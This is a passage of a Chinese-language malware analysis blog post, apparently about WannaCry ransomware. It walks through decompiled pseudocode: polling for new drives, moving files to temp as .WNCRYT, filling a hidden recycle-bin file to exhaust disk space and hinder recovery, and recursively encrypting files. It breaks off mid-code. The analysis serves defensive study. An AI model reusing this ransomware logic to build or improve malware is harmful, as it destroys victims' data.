<p>每隔5秒检测时候存在 dky 文件，存在就 引入 公钥并 进行 加解密操作</p>
<h2 id="6-2-EncrypteAllFiles-线程回调-加密-Important"><a href="#6-2-EncrypteAllFiles-线程回调-加密-Important" class="headerlink" title="6.2 EncrypteAllFiles 线程回调+加密 (Important)"></a>6.2 EncrypteAllFiles 线程回调+加密 (Important)</h2><blockquote>
<p>作为病毒的核心函数嵌套了，里外嵌套了很多层</p>
</blockquote>
<h3 id="6-2-1-第一层"><a href="#6-2-1-第一层" class="headerlink" title="6.2.1 第一层"></a>6.2.1 第一层</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">Drives <span class="token operator">=</span> <span class="token function">GetLogicalDrives</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// 获取驱动中所有磁盘  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_1000DD8C <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">3000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

Drives_1 <span class="token operator">=</span> Drives<span class="token punctuation">;</span>  

Drives <span class="token operator">=</span> <span class="token function">GetLogicalDrives</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> Drives <span class="token operator">!=</span> Drives_1 <span class="token punctuation">)</span>                 <span class="token comment">// 检测是否有新的磁盘加入  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>循环检测是否有新的磁盘加入，有就加密，没有就一直循环</p>
<h3 id="6-2-2-第二层"><a href="#6-2-2-第二层" class="headerlink" title="6.2.2 第二层"></a>6.2.2 第二层</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">DWORD __stdcall <span class="token function">sub_10005680</span><span class="token punctuation">(</span>LPVOID Num_3<span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">char</span> Parameter<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-930h]  </span>

<span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+92Ch] [ebp-4h]  </span>



<span class="token function">InitCritical</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// 初始化临界区  </span>

v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">MovFileToTemp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>sub_10005340<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>dword_1000DD8C<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 移动文件到临时目录下并重命名为.WNCRTY  </span>

<span class="token punctuation">&#123;</span>  

<span class="token function">EncryptFile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">,</span> <span class="token punctuation">(</span>LONG<span class="token punctuation">)</span>Num_3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 加密磁盘上的所有文件   </span>

<span class="token function">FillDisk</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Num_3<span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">// 在回收站创建一个文件 并且循环写入数据直到磁盘空间不足  </span>

<span class="token function">ReleaseResouce</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 释放资源  </span>

<span class="token function">ExitThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

v3 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token function">DeleteCritical</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 释放临界区  </span>

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<blockquote>
<p>第二层中有三个比较重要的函数，起到了防止恢复软件对删除文件进行恢复等作用</p>
</blockquote>
<h4 id="6-2-2-1-MoveFileToTemp-移动文件并重命名"><a href="#6-2-2-1-MoveFileToTemp-移动文件并重命名" class="headerlink" title="6.2.2.1 MoveFileToTemp 移动文件并重命名"></a>6.2.2.1 MoveFileToTemp 移动文件并重命名</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">result <span class="token operator">=</span> <span class="token punctuation">(</span>HGLOBAL<span class="token punctuation">)</span><span class="token function">CreatePkyAndEky</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>lpParameter <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> lpFileName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 创建00000000.pky和00000000.eky文件 此时文件已存在 直接退出函数  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> lpFileName <span class="token punctuation">)</span>                           <span class="token comment">// lpFileName=00000000.pky  </span>

<span class="token function">CreatePkyAndEky</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 再一次检测是否存在这两个文件  </span>

result <span class="token operator">=</span> <span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 申请0x10000大小的空间  </span>

<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">0x132</span><span class="token punctuation">)</span> <span class="token operator">=</span> result<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

result <span class="token operator">=</span> <span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 再次申请0x10000大小的空间  </span>

<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">0x133</span><span class="token punctuation">)</span> <span class="token operator">=</span> result<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">InitializeCriticalSection</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPCRITICAL_SECTION<span class="token punctuation">)</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">1260</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">310</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>StartAddress<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 将文件移动到临时目录下并重命名为WNCRTY  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该函数单独创建了一个线程 将一部分文本文件移动到临时目录并重命名</p>
<p>值得注意的是，这时文件并没有进行加密，是可以直接通过修改后缀名修复的</p>
<h4 id="6-2-2-2-FillDisk-回收站循环写入"><a href="#6-2-2-2-FillDisk-回收站循环写入" class="headerlink" title="6.2.2.2 FillDisk 回收站循环写入"></a>6.2.2.2 FillDisk 回收站循环写入</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span>__cdecl <span class="token function">FillDisk</span><span class="token punctuation">(</span><span class="token keyword">int</span> Num_3<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  

hGlobal <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">GetDriveTypeW</span><span class="token punctuation">(</span>RootPathName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取磁盘类型  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> hGlobal <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>DRIVE_FIXED <span class="token punctuation">)</span>         <span class="token comment">// 如果是固定磁盘  </span>

<span class="token punctuation">&#123;</span>  

hGlobal <span class="token operator">=</span> <span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xA00000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 申请0xA00000大小的固定空间  </span>

hGlobal_1 <span class="token operator">=</span> hGlobal<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> hGlobal <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">memset</span><span class="token punctuation">(</span>hGlobal<span class="token punctuation">,</span> <span class="token number">0x55u</span><span class="token punctuation">,</span> <span class="token number">0xA00000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 将申请的空间全部初始化为5  </span>

FileName <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x204u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">DeleteRecycleFile</span><span class="token punctuation">(</span>Num_3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FileName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 删除$RECYCLE的hibsys.WNCRYT文件  </span>

hFile <span class="token operator">=</span> <span class="token function">CreateFileW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>FileName<span class="token punctuation">,</span> GENERIC_WRITE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> CREATE_ALWAYS<span class="token punctuation">,</span> FILE_ATTRIBUTE_HIDDEN<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 在$RECYCLE下创建一个hibsys.WNCRYT 属性为隐藏  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> hFile <span class="token operator">==</span> <span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

hGlobal <span class="token operator">=</span> <span class="token function">GlobalFree</span><span class="token punctuation">(</span>hGlobal_1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 创建失败直接释放空间  </span>

<span class="token punctuation">&#125;</span>  

<span class="token keyword">else</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">MoveFileExW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>FileName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MOVEFILE_DELAY_UNTIL_REBOOT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 在系统下次重新启动时正式进行移动文件操作  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_1000DD8C <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

LABEL_6<span class="token operator">:</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetDiskFreeSpaceExW</span><span class="token punctuation">(</span>             <span class="token comment">// 获取D盘的剩余空间的大小 确保空间足够  </span>

RootPathName<span class="token punctuation">,</span>  

<span class="token operator">&amp;</span>FreeBytesAvailableToCaller<span class="token punctuation">,</span>  

<span class="token operator">&amp;</span>TotalNumberOfBytes<span class="token punctuation">,</span>  

<span class="token operator">&amp;</span>TotalNumberOfFreeBytes<span class="token punctuation">)</span>  

<span class="token operator">&amp;&amp;</span> TotalNumberOfFreeBytes<span class="token punctuation">.</span>QuadPart <span class="token operator">></span> <span class="token number">0x40000000</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">WriteFile</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> hGlobal_1<span class="token punctuation">,</span> <span class="token number">0xA00000u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>NumberOfBytesWritten<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 将0xA00000个字节的5写入到hibsys.WNCRYT  </span>

<span class="token punctuation">&#123;</span>  

<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">++</span>index <span class="token operator">>=</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token comment">// 循环写入20次  </span>

<span class="token punctuation">&#123;</span>  

<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">10000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_1000DD8C <span class="token punctuation">)</span>  

<span class="token keyword">goto</span> LABEL_6<span class="token punctuation">;</span>                 <span class="token comment">// 当磁盘剩余空间不足时跳出循环  </span>

<span class="token keyword">break</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token function">GlobalFree</span><span class="token punctuation">(</span>hGlobal_1<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// 释放申请的内存  </span>

<span class="token function">FlushFileBuffers</span><span class="token punctuation">(</span>hFile<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 刷新文件缓冲区  </span>

<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hFile<span class="token punctuation">)</span><span class="token punctuation">;</span>  

hGlobal <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">DeleteFileW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>FileName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 删除临时目录文件夹下的hibsys.WNCRYT  </span>

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">return</span> hGlobal<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个函数 会在 $RECYCLE 下创建一个名为 hibsys.WNCRYT 的文件<br>并设置属性为隐藏，并循环往这个文件写入数据，知道磁盘空间不足</p>
<p>在我们的测试环境下，这个文件已经达到了 39个G</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image19.png" class="" width="19">

<h4 id="6-2-2-3-EncryptFile-加密磁盘上的所有文件"><a href="#6-2-2-3-EncryptFile-加密磁盘上的所有文件" class="headerlink" title="6.2.2.3 EncryptFile 加密磁盘上的所有文件"></a>6.2.2.3 EncryptFile 加密磁盘上的所有文件</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token punctuation">)</span>                                     <span class="token comment">// 条件不成立  </span>

<span class="token punctuation">&#123;</span>  

uDriveType <span class="token operator">=</span> GetDriveTypeW<span class="token punctuation">;</span>                 <span class="token comment">// 获取磁盘类型  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetDriveTypeW</span><span class="token punctuation">(</span>DirectoryName<span class="token punctuation">)</span> <span class="token operator">==</span> DRIVE_CDROM <span class="token punctuation">)</span><span class="token comment">// 如果是CD驱动器直接返回  </span>

<span class="token keyword">return</span><span class="token punctuation">;</span>  

<span class="token function">InterlockedExchange</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Target<span class="token punctuation">,</span> Value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 交换两个数  </span>

<span class="token keyword">goto</span> LABEL_12<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">InterlockedExchangeAdd</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> Value <span class="token punctuation">)</span><span class="token comment">// 用于对一个32位数值执行加法的原子操作  </span>

<span class="token punctuation">&#123;</span>  

v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">GetDiskFreeSpaceExW</span><span class="token punctuation">(</span>               <span class="token comment">// 获取D盘的空余容量 如果失败直接返回  </span>

DirectoryName<span class="token punctuation">,</span>  

<span class="token operator">&amp;</span>FreeBytesAvailableToCaller<span class="token punctuation">,</span>  

<span class="token operator">&amp;</span>TotalNumberOfBytes<span class="token punctuation">,</span>  

<span class="token operator">&amp;</span>TotalNumberOfFreeBytes<span class="token punctuation">)</span>  

<span class="token operator">||</span> <span class="token operator">!</span>TotalNumberOfBytes<span class="token punctuation">.</span>QuadPart <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v3 <span class="token operator">>=</span> <span class="token number">30</span> <span class="token punctuation">)</span>  

<span class="token keyword">return</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

uDriveType <span class="token operator">=</span> GetDriveTypeW<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetDriveTypeW</span><span class="token punctuation">(</span>DirectoryName<span class="token punctuation">)</span> <span class="token operator">!=</span> DRIVE_CDROM <span class="token punctuation">)</span><span class="token comment">// 获取磁盘类型  </span>

<span class="token punctuation">&#123;</span>  

LABEL_12<span class="token operator">:</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">uDriveType</span><span class="token punctuation">(</span>DirectoryName<span class="token punctuation">)</span> <span class="token operator">==</span> DRIVE_FIXED <span class="token punctuation">)</span><span class="token comment">// 如果磁盘类型是固定磁盘  </span>

<span class="token punctuation">&#123;</span>  

lpPath <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v11<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x204u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">GetRecyclePathOrTempPath</span><span class="token punctuation">(</span>Value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpPath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取C盘下临时文件和回收站路径  </span>

<span class="token function">GetFilePath</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>Path<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpPath<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取文件路径D:$RECYCLE0.WNCRYT  </span>

<span class="token punctuation">&#125;</span>  

<span class="token function">LOWORD</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">CoreEncryptFun</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>Path<span class="token punctuation">,</span> DirectoryName<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 核心函数 加密操作  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该函数主体仍是加密文件之前的预处理部分，涉及具体的加密过程要进入<br>CoreEncryptFun 函数进行分析。</p>
<h3 id="6-2-3-第三层"><a href="#6-2-3-第三层" class="headerlink" title="6.2.3 第三层"></a>6.2.3 第三层</h3><p>TraverseAndEncryptFiles(v3, DirectoryName, (int)&amp;v15, -1, a3);// 遍历所有文件 并且加密 </p>
<p>第三层主要就是递归调用这个加密函数并对所有要加密文件进行遍历，下面我们继续深入</p>
<h3 id="6-2-4-第四层"><a href="#6-2-4-第四层" class="headerlink" title="6.2.4 第四层"></a>6.2.4 第四层</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">FileKind <span class="token operator">=</span> <span class="token function">FilterPostFix</span><span class="token punctuation">(</span>FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 对后缀进行过滤 返回值为1说明是exe或dll 2说明是文本文件或者图片  </span>

v48 <span class="token operator">=</span> FileKind<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> FileKind <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">6</span>   <span class="token comment">// 如果后缀为.WNCRY直接跳过  </span>

<span class="token operator">&amp;&amp;</span> FileKind <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">1</span>   <span class="token comment">// 如果是exe和dll直接跳过遍历下一个文件  </span>

<span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>FileKind <span class="token operator">||</span> FindFileData<span class="token punctuation">.</span>nFileSizeHigh <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span> FindFileData<span class="token punctuation">.</span>nFileSizeLow <span class="token operator">>=</span> <span class="token number">0xC800000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">wcsncpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>TaegetFileName<span class="token punctuation">,</span> FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">,</span> <span class="token number">0x103u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将文件名拷贝到目标内存  </span>

<span class="token function">wcsncpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>TargetFileFullPath<span class="token punctuation">,</span> <span class="token operator">&amp;</span>String<span class="token punctuation">,</span> <span class="token number">0x167u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将完整路径拷贝到目标内存  </span>

dwFileSizeHigh <span class="token operator">=</span> FindFileData<span class="token punctuation">.</span>nFileSizeHigh<span class="token punctuation">;</span>  

dwFileSizeLow <span class="token operator">=</span> FindFileData<span class="token punctuation">.</span>nFileSizeLow<span class="token punctuation">;</span>  

<span class="token function">sub_10003760</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v36<span class="token punctuation">,</span> v33<span class="token punctuation">,</span> <span class="token operator">&amp;</span>TargetFileFullPath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 这个函数会操作容器将容器的计数+1  </span>

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

hFile <span class="token operator">=</span> hFindFile<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">FindNextFileW</span><span class="token punctuation">(</span>hFindFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FindFileData<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 查找下一个文件  </span>

<span class="token function">FindClose</span><span class="token punctuation">(</span>hFile<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token punctuation">)</span>v33<span class="token punctuation">;</span> i <span class="token operator">!=</span> v33<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token punctuation">)</span>i <span class="token punctuation">)</span><span class="token comment">// 循环加密所有的文件  </span>

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">EncryptAllFile</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token comment">// 加密所有文件  </span>

